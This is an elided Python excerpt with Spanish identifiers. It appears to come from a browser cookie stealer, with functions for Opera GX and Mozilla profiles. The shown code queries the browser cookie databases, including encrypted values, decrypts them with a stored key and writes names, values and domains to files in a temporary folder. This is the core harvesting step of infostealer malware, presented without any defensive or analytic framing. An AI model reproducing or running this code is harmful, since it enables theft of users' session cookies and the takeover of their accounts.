...
def OperaGX():
    ...
    if os.path.exists(carpeta):
        ...
        orden = sql.cursor()
        orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
        with open(f"{temp}{os.sep}operaGX({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
            for cookies in orden.fetchall():
                nombre = cookies[0]
                valor = decrypt_valor(cookies[1], clave2)
                domain = cookies[2]
...
def mozilla():
    ...
    for perfiles in listar_perfiles:
        ...
        with open(f"{temp}{os.sep}mozilla_cookies({nombre}).txt", mode='a', newline='', encoding='utf-8') as cookies_txt:
